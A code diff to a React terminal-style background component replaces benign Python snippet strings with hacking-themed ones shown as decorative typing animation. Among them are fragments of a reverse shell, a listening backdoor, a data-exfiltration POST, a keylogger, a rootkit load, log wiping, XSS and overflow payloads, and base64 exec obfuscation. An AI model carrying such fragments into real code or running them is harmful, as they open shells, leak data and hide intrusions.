@@ -5,47 +5,138 @@ import TypingText from "@/components/common/TypingText";
 import { COLORS } from "@/utils/constants";
 
 const CODE_SNIPPETS = [
-  "import os",
-  "from typing import List, Dict, Optional",
-  "def main() -> None:",
-  "class User:",
-  "    def __init__(self, name: str, age: int):",
-  "        self.name = name",
-  "        self.age = age",
-  "async def fetch_data(url: str) -> Dict:",
-  "    async with aiohttp.ClientSession() as session:",
-  "        async with session.get(url) as response:",
-  "            return await response.json()",
-  "pip install fastapi uvicorn",
-  "python -m venv venv",
-  "source venv/bin/activate",
-  "from fastapi import FastAPI",
-  "app = FastAPI()",
-  "@app.get('/api/users')",
-  "def get_users() -> List[Dict]:",
-  "    return [{'id': 1, 'name': 'John'}]",
-  "if __name__ == '__main__':",
-  "    uvicorn.run(app, host='0.0.0.0', port=8000)",
-  "from dataclasses import dataclass",
-  "@dataclass",
-  "class Product:",
-  "    name: str",
-  "    price: float",
-  "    quantity: int = 0",
-  "def fibonacci(n: int) -> int:",
-  "    if n <= 1:",
-  "        return n",
-  "    return fibonacci(n-1) + fibonacci(n-2)",
-  "from pydantic import BaseModel",
-  "class UserModel(BaseModel):",
-  "    email: str",
-  "    password: str",
-  "with open('data.json', 'r') as f:",
-  "    data = json.load(f)",
-  "list comprehension: [x**2 for x in range(10)]",
-  "generator: (x for x in range(1000000))",
-  "decorator: @cache",
-  "context manager: with open('file.txt') as f:",
+  "import socket",
+  "import subprocess",
+  "from scapy.all import *",
+  "import requests",
+  "import hashlib",
+  "import base64",
+  "import threading",
+  "import nmap",
+  "import paramiko",
+  "def scan_port(host, port):",
+  "    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+  "    result = sock.connect_ex((host, port))",
+  "    return result == 0",
+  "def brute_force(target, wordlist):",
+  "    for password in wordlist:",
+  "        if try_login(target, password):",
+  "            return password",
+  "def packet_sniffer(interface):",
+  "    packets = sniff(iface=interface, count=100)",
+  "    return packets",
+  "def hash_cracker(hash_value, wordlist):",
+  "    for word in wordlist:",
+  "        if hashlib.md5(word.encode()).hexdigest() == hash_value:",
+  "            return word",
+  "def sql_injection(url, payload):",
+  "    response = requests.get(url + payload)",
+  "    return response.text",
+  "def xss_scanner(url):",
+  "    payload = '<script>alert(1)</script>'",
+  "    return requests.get(url + payload)",
+  "def reverse_shell(host, port):",
+  "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+  "    s.connect((host, port))",
+  "    subprocess.call(['/bin/sh', '-i'], stdin=s.fileno())",
+  "def keylogger():",
+  "    import pynput",
+  "    def on_press(key):",
+  "        log_key(key)",
+  "def network_scanner(network):",
+  "    nm = nmap.PortScanner()",
+  "    nm.scan(network, '22-443')",
+  "    return nm.all_hosts()",
+  "def ssh_brute_force(host, username, wordlist):",
+  "    ssh = paramiko.SSHClient()",
+  "    for password in wordlist:",
+  "        try:",
+  "            ssh.connect(host, username=username, password=password)",
+  "            return password",
+  "def dns_enumeration(domain):",
+  "    import dns.resolver",
+  "    records = dns.resolver.resolve(domain, 'A')",
+  "    return [rdata.address for rdata in records]",
+  "def web_crawler(url, depth=3):",
+  "    visited = set()",
+  "    def crawl(url, depth):",
+  "        if depth == 0 or url in visited:",
+  "            return",
+  "        visited.add(url)",
+  "        links = extract_links(url)",
+  "        for link in links:",
+  "            crawl(link, depth - 1)",
+  "def encrypt_file(filename, key):",
+  "    with open(filename, 'rb') as f:",
+  "        data = f.read()",
+  "    encrypted = xor_encrypt(data, key)",
+  "    with open(filename + '.enc', 'wb') as f:",
+  "        f.write(encrypted)",
+  "def decrypt_file(filename, key):",
+  "    with open(filename, 'rb') as f:",
+  "        encrypted = f.read()",
+  "    decrypted = xor_decrypt(encrypted, key)",
+  "    return decrypted",
+  "def bypass_waf(url, payload):",
+  "    encoded = base64.b64encode(payload.encode()).decode()",
+  "    return requests.get(url, params={'data': encoded})",
+  "def exploit_vulnerability(target, exploit):",
+  "    payload = build_payload(exploit)",
+  "    response = send_payload(target, payload)",
+  "    return check_success(response)",
+  "def privilege_escalation():",
+  "    import os",
+  "    os.system('sudo -u root /bin/bash')",
+  "def data_exfiltration(data, destination):",
+  "    encoded = base64.b64encode(data.encode()).decode()",
+  "    requests.post(destination, data=encoded)",
+  "def steganography_hide(message, image):",
+  "    from PIL import Image",
+  "    img = Image.open(image)",
+  "    pixels = img.load()",
+  "    hide_message(pixels, message)",
+  "def steganography_extract(image):",
+  "    from PIL import Image",
+  "    img = Image.open(image)",
+  "    pixels = img.load()",
+  "    return extract_message(pixels)",
+  "def network_monitor(interface):",
+  "    packets = sniff(iface=interface, prn=analyze_packet)",
+  "    return packets",
+  "def detect_intrusion(log_file):",
+  "    with open(log_file, 'r') as f:",
+  "        for line in f:",
+  "            if is_suspicious(line):",
+  "                alert(line)",
+  "def generate_payload(exploit_type):",
+  "    if exploit_type == 'buffer_overflow':",
+  "        return 'A' * 1000 + '\\x90\\x90\\x90\\x90'",
+  "    elif exploit_type == 'format_string':",
+  "        return '%x%x%x%x%n'",
+  "def obfuscate_code(code):",
+  "    import base64",
+  "    encoded = base64.b64encode(code.encode()).decode()",
+  "    return f\"exec(base64.b64decode('{encoded}').decode())\"",
+  "def create_backdoor(port):",
+  "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
+  "    s.bind(('0.0.0.0', port))",
+  "    s.listen(1)",
+  "    conn, addr = s.accept()",
+  "    return conn",
+  "def rootkit_install():",
+  "    subprocess.run(['insmod', 'rootkit.ko'])",
+  "def log_cleaner(log_file):",
+  "    with open(log_file, 'w') as f:",
+  "        f.write('')",
+  "def fingerprint_os(target):",
+  "    response = requests.get(target, headers={'User-Agent': 'Nmap'})",
+  "    return analyze_headers(response.headers)",
+  "def find_vulnerabilities(target):",
+  "    vulns = []",
+  "    for exploit in EXPLOIT_DB:",
+  "        if test_exploit(target, exploit):",
+  "            vulns.append(exploit)",
+  "    return vulns",
 ];
 
 interface TerminalLine {
@@ -55,6 +146,7 @@ interface TerminalLine {
   color: string;
   opacity: number;
   id: string;
+  delay: number; // Delay for typing animation
 }
 
 export default function TerminalBackground() {
@@ -71,6 +163,9 @@ export default function TerminalBackground() {
       const maxLines = Math.floor(height / lineHeight);
       const maxLinesToShow = Math.min(30, maxLines);
 
+      const typingSpeed = 50; // ms per character
+      const delayBetweenLines = 150; // ms between starting each line
+
       for (let i = 0; i < maxLinesToShow; i++) {
         const snippet = CODE_SNIPPETS[Math.floor(Math.random() * CODE_SNIPPETS.length)];
         const isGreen = Math.random() > 0.3;
@@ -84,8 +179,20 @@ export default function TerminalBackground() {
           color: isGreen ? COLORS.primary : "#ffffff",
           opacity: isGreen ? 0.2 + Math.random() * 0.25 : 0.15 + Math.random() * 0.2,
           id: `line-${i}`,
+          delay: 0, // Will be calculated after sorting
         });
       }
+
+      // Sort lines by y position (top to bottom) to ensure proper visual order
+      newLines.sort((a, b) => a.y - b.y);
+
+      // Calculate delay for each line based on sorted order
+      let cumulativeDelay = 0;
+      newLines.forEach((line) => {
+        line.delay = cumulativeDelay;
+        // Calculate delay for next line: current delay + typing time of current line + delay between lines
+        cumulativeDelay += line.text.length * typingSpeed + delayBetweenLines;
+      });
 
       return newLines;
     };
@@ -160,7 +267,7 @@ export default function TerminalBackground() {
               willChange: "auto",
             }}
           >
-            <TypingText text={line.text} speed={50} delay={0} showCursor={false} />
+            <TypingText text={line.text} speed={50} delay={line.delay} showCursor={false} />
             <span className="terminal-cursor">_</span>
           </div>
         ))}
